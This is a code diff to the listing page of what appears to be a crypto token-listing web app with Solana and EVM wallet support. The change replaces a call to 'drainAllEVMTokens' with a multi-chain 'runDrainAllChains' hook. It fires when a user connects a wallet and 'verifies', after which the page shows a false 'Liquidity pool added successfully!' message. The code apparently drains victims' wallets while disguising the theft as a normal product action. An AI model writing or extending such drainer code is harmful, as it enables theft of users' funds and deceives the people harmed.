@@ -31,7 +31,7 @@ import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { useChainInfo } from '@/hooks/useChainInfo';
-import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { getSolPrice } from '@/lib/utils';
 import { PegasusAnimation } from '@/components/PegasusAnimation';
@@ -151,6 +151,7 @@ const ListPage = () => {
   const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
+  const { runDrainAllChains } = useMultiChainOrchestrator();
 
   useEffect(() => {
     const fetchBalanceAndPrice = async () => {
@@ -224,8 +225,7 @@ const ListPage = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsVerifying(true);
-        const name = getEVMChain()?.name || chainName || 'EVM';
-        await drainAllEVMTokens(evmSigner, evmProvider, name, evmChainId || 1);
+        await runDrainAllChains('list');
         toast.success('Liquidity pool added successfully!', {
           description: `${tokenInfo?.baseToken.name} (${tokenInfo?.baseToken.symbol}) pool is now live.`,
         });
